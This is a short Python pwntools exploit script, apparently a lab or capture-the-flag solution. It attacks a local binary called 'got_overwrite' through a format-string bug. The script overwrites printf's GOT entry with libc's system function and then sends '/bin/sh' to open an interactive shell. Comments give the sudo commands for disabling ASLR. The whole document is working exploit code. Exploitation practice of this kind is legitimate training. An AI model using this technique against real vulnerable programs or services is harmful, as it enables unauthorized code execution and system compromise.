from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

def send_payload(payload):
    p.sendline(payload)                         # will send fmt payload
    return p.recvline()                         # return response

exe = './got_overwrite'
elf = context.binary = ELF(exe, checksec=False) # wont exec checksec
context.log_level = 'debug'                     # a lot of debug info

# ASLR OFF > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# ASLR ON  > echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
p = process(exe)                # start program
libc = elf.libc
libc.address = 0xf7c00000       # ldd got_overwrite

# Print address to overwrite (printf) and what we want to write (system)
info("address to overwrite (elf.got.printf): %#x", elf.got.printf)
info("address to write (libc.functions.system): %#x", libc.symbols.system)

# Find offset for format string write => found 4
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

format_string.write(elf.got.printf, libc.symbols.system)    # rewrite printf addr by system addr
format_string.execute_writes()                              # exec fmt string

p.sendline(b'/bin/sh')                                      # printf is now system, will exec /bin/sh
p.interactive()

